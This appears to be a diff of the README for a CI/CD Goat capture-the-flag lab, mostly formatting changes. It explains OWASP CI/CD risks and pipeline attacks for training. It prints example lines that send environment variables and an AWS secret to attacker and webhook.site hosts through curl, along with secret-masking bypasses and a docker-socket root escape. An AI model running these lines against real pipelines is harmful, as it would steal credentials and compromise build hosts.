@@ -19,6 +19,7 @@ This lab provisions the CI/CD Goat CTFd challenge platform preloaded with CTF fl
 ## Quick Start & Lab Profiles
 
 ### Mode 1: CTFd Challenge Portal (Default & Lightweight)
+
 Launches the full interactive CTFd challenge platform with problem descriptions, clues, and flag submission forms:
 
 ```bash
@@ -31,6 +32,7 @@ docker compose up -d
 ```
 
 ### Mode 2: Full Infrastructure Mode (CTFd + Gitea + Jenkins + Runner Agent)
+
 Launches the complete live attack lab with local VCS (Gitea) and CI/CD server (Jenkins):
 
 ```bash
@@ -64,18 +66,18 @@ docker compose --profile full up -d
 +---------------------------------------------------------------------------------------------------------+
 ```
 
-| ID | Vulnerability Title | Core Impact | Real-World Scenario |
-|:---|:--------------------|:------------|:--------------------|
-| **CICD-SEC-1** | **Insufficient Flow Control** | Unauthorized code pushes to production | Branch protection missing; an attacker with developer commit access directly pushes a backdoor to `main`. |
-| **CICD-SEC-2** | **Inadequate Identity & Access Management** | Lateral movement & privilege escalation | Personal Access Tokens (PATs) or CI machine tokens assigned Organization Owner or administrative AWS roles. |
-| **CICD-SEC-3** | **Dependency Chain Abuse** | Compromised third-party packages | Pipeline fetches packages from public npm/PyPI without checking internal namespace scopes (dependency confusion). |
-| **CICD-SEC-4** | **Poisoned Pipeline Execution (PPE)** | Arbitrary command execution on build runners | An attacker modifies the pipeline configuration or a build script via PR to steal secrets. |
-| **CICD-SEC-5** | **Insufficient Pipeline PBAC** | Build jobs stealing production credentials | A linting or testing job on an untrusted branch has read access to production deployment keys. |
-| **CICD-SEC-6** | **Insufficient Credential Hygiene** | Long-lived credential leakage | Static AWS keys or production passwords stored in plain text environment variables rather than OIDC or dynamic Vault secrets. |
-| **CICD-SEC-7** | **System Insecurities (Runner Breakout)** | Compromise of host node and runner fleet | Self-hosted runner mounts `/var/run/docker.sock`, allowing container escape to host root. |
-| **CICD-SEC-8** | **Ungoverned 3rd Party Usage** | Supply chain backdoors via CI extensions | Pipeline uses an unpinned GitHub Action (`uses: action@master`) that gets hijacked upstream. |
-| **CICD-SEC-9** | **Improper Artifact Integrity Validation** | Delivery of modified artifacts to customers | Build artifact or Docker container is modified on the registry before deployment because signatures (Cosign) are absent. |
-| **CICD-SEC-10**| **Insufficient Logging & Visibility** | Undetected intrusion and data theft | Pipeline runs do not ship execution logs to SIEM; audit logs for secret access are disabled. |
+| ID              | Vulnerability Title                         | Core Impact                                  | Real-World Scenario                                                                                                           |
+| :-------------- | :------------------------------------------ | :------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------------- |
+| **CICD-SEC-1**  | **Insufficient Flow Control**               | Unauthorized code pushes to production       | Branch protection missing; an attacker with developer commit access directly pushes a backdoor to `main`.                     |
+| **CICD-SEC-2**  | **Inadequate Identity & Access Management** | Lateral movement & privilege escalation      | Personal Access Tokens (PATs) or CI machine tokens assigned Organization Owner or administrative AWS roles.                   |
+| **CICD-SEC-3**  | **Dependency Chain Abuse**                  | Compromised third-party packages             | Pipeline fetches packages from public npm/PyPI without checking internal namespace scopes (dependency confusion).             |
+| **CICD-SEC-4**  | **Poisoned Pipeline Execution (PPE)**       | Arbitrary command execution on build runners | An attacker modifies the pipeline configuration or a build script via PR to steal secrets.                                    |
+| **CICD-SEC-5**  | **Insufficient Pipeline PBAC**              | Build jobs stealing production credentials   | A linting or testing job on an untrusted branch has read access to production deployment keys.                                |
+| **CICD-SEC-6**  | **Insufficient Credential Hygiene**         | Long-lived credential leakage                | Static AWS keys or production passwords stored in plain text environment variables rather than OIDC or dynamic Vault secrets. |
+| **CICD-SEC-7**  | **System Insecurities (Runner Breakout)**   | Compromise of host node and runner fleet     | Self-hosted runner mounts `/var/run/docker.sock`, allowing container escape to host root.                                     |
+| **CICD-SEC-8**  | **Ungoverned 3rd Party Usage**              | Supply chain backdoors via CI extensions     | Pipeline uses an unpinned GitHub Action (`uses: action@master`) that gets hijacked upstream.                                  |
+| **CICD-SEC-9**  | **Improper Artifact Integrity Validation**  | Delivery of modified artifacts to customers  | Build artifact or Docker container is modified on the registry before deployment because signatures (Cosign) are absent.      |
+| **CICD-SEC-10** | **Insufficient Logging & Visibility**       | Undetected intrusion and data theft          | Pipeline runs do not ship execution logs to SIEM; audit logs for secret access are disabled.                                  |
 
 ---
 
@@ -108,7 +110,9 @@ docker compose --profile full up -d
 ```
 
 ### 1. Direct PPE
+
 The attacker directly modifies the pipeline configuration file:
+
 - `.github/workflows/build.yml`
 - `.gitlab-ci.yml`
 - `Jenkinsfile`
@@ -124,22 +128,29 @@ The attacker directly modifies the pipeline configuration file:
 ```
 
 ### 2. Indirect PPE
+
 Many organizations protect their `.github/workflows/` or `.gitlab-ci.yml` files using branch protection rules and CODEOWNERS. However, the workflow still runs developer-controlled build scripts!
 If the workflow runs:
+
 ```yaml
 run: make test
 ```
+
 The attacker modifies `Makefile` in their PR without touching the protected workflow file:
+
 ```makefile
 test:
 	@echo "Running tests..."
 	@curl -s https://attacker-webhook.site/log -d "$$(env)"
 ```
+
 Because the workflow file was not changed, automated scanners and CODEOWNERS approvals are often completely bypassed.
 
 ### 3. Public PPE (The `pull_request_target` Trap)
+
 In GitHub Actions, `on: pull_request_target` runs in the context of the base branch and has access to repository secrets, even when triggered by a fork!
 If the workflow checks out the untrusted fork's code:
+
 ```yaml
 on: pull_request_target
 jobs:
@@ -153,6 +164,7 @@ jobs:
         env:
           PROD_DEPLOY_KEY: ${{ secrets.PROD_DEPLOY_KEY }}
 ```
+
 Any external contributor on the Internet can submit a PR that steals `PROD_DEPLOY_KEY`.
 
 ---
@@ -160,6 +172,7 @@ Any external contributor on the Internet can submit a PR that steals `PROD_DEPLO
 ## Attack Vector 2: Build Runner Breakout & Shared Runner Abuse
 
 ### Threat Model: The Docker Socket Trap
+
 In many organizations, self-hosted runners are deployed with Docker installed to allow jobs to build container images ("Docker-in-Docker"). To save compute costs or simplify setups, administrators mount the host's Docker socket:
 
 ```yaml
@@ -168,6 +181,7 @@ volumes:
 ```
 
 ### Exploitation Walkthrough
+
 Any command running inside the build container can communicate directly with the host's Docker daemon. Since Docker daemon runs as `root` on the host, this yields immediate root escape!
 
 ```bash
@@ -190,24 +204,28 @@ cat /etc/shadow
 CI/CD engines attempt to "mask" secrets printed to console output by replacing known secret strings with `***`. However, secret masking is purely a string-matching filter on stdout and can be effortlessly bypassed:
 
 ### 1. Base64 & Hex Encoding
+
 ```bash
 echo -n "$SECRET_AWS_KEY" | base64
 # Masker fails because the base64 string does not match the plaintext secret
 ```
 
 ### 2. Character Splitting & Inverted Formatting
+
 ```bash
 echo "$SECRET_TOKEN" | sed 's/./& /g'
 # Prints characters separated by spaces: s e c r e t _ v a l u e
 ```
 
 ### 3. Memory & Process Inspection
+
 ```bash
 # Inspect all environment variables of the running runner processes
 cat /proc/1/environ | tr '\0' '\n'
 ```
 
 ### 4. Direct Out-of-Band Exfiltration
+
 ```bash
 curl -X POST https://webhook.site/uuid -d "key=$SECRET_AWS_KEY"
 ```
@@ -216,14 +234,14 @@ curl -X POST https://webhook.site/uuid -d "key=$SECRET_AWS_KEY"
 
 ## CI/CD Goat Flag Walkthrough Reference
 
-| Challenge Name | OWASP Risk | Objective & Key Technique |
-|:---|:---|:---|
-| **White Rabbit** | CICD-SEC-4 (Direct PPE) | Analyze repository history, discover pipeline execution flaws, and modify pipeline to extract runner secrets. |
-| **Mad Hatter** | CICD-SEC-7 (Runner Breakout) | Break out of the unhardened build runner environment using privileged container mounts and extract credentials. |
-| **Cheshire Cat** | CICD-SEC-3 (Dependency Abuse) | Exploit an unvetted package dependency in the build pipeline to achieve remote code execution. |
-| **Tweedledee** | CICD-SEC-2 (IAM & Tokens) | Enumerate excessive GitHub Personal Access Token permissions and escalate privileges to org admin. |
-| **Dodo** | CICD-SEC-6 (Credential Hygiene) | Discover leaked credentials stored in commit logs or unmasked build job outputs. |
-| **Queen of Hearts** | CICD-SEC-9 (Artifact Tampering) | Intercept build artifacts before release and poison production binaries. |
+| Challenge Name      | OWASP Risk                      | Objective & Key Technique                                                                                       |
+| :------------------ | :------------------------------ | :-------------------------------------------------------------------------------------------------------------- |
+| **White Rabbit**    | CICD-SEC-4 (Direct PPE)         | Analyze repository history, discover pipeline execution flaws, and modify pipeline to extract runner secrets.   |
+| **Mad Hatter**      | CICD-SEC-7 (Runner Breakout)    | Break out of the unhardened build runner environment using privileged container mounts and extract credentials. |
+| **Cheshire Cat**    | CICD-SEC-3 (Dependency Abuse)   | Exploit an unvetted package dependency in the build pipeline to achieve remote code execution.                  |
+| **Tweedledee**      | CICD-SEC-2 (IAM & Tokens)       | Enumerate excessive GitHub Personal Access Token permissions and escalate privileges to org admin.              |
+| **Dodo**            | CICD-SEC-6 (Credential Hygiene) | Discover leaked credentials stored in commit logs or unmasked build job outputs.                                |
+| **Queen of Hearts** | CICD-SEC-9 (Artifact Tampering) | Intercept build artifacts before release and poison production binaries.                                        |
 
 ---
 
@@ -258,6 +276,7 @@ All video links have been verified active via the YouTube oEmbed API (`HTTP 200 
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
 
 ```bash
